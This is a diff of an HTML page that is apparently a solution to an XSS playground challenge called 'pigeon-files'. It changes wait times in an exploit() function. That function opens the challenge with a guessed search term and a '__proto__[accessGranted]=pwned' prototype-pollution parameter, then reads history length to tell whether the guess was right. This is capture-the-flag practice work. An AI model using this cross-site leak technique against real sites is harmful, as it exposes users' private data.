@@ -24,7 +24,7 @@
     | <a href="/">Home</a>
   </p>
   <p>
-    <a href="https://xss-playground-challenges.vercel.app/pigeon-files/" target="_blank">Submit your note first</a>, then try to search it.
+    <a href="https://xss-playground-challenges.vercel.app/pigeon-files/" target="_blank">Submit your note first</a>, then try to search it. It takes around 3 seconds to show the result.
   </p>
   <input id="search" type="text" placeholder="Search">
   <button onclick="exploit()">Search</button>
@@ -41,11 +41,11 @@
 
         let opened = window.open(`https://xss-playground-challenges.vercel.app/pigeon-files/?search=${guess}&token=&__proto__[accessGranted]=pwned`);
 
-        // Allow 6 second for the navigations to happen
-        await sleep(6000);
+        // Allow 2 seconds for the navigations to happen
+        await sleep(2000);
         opened.location = "about:blank";
 
-        // Allow 1 seconds for the redirects to complete
+        // Allow 1 second for the redirects to complete
         await sleep(1000);
         
         const success = opened.history.length === 3;
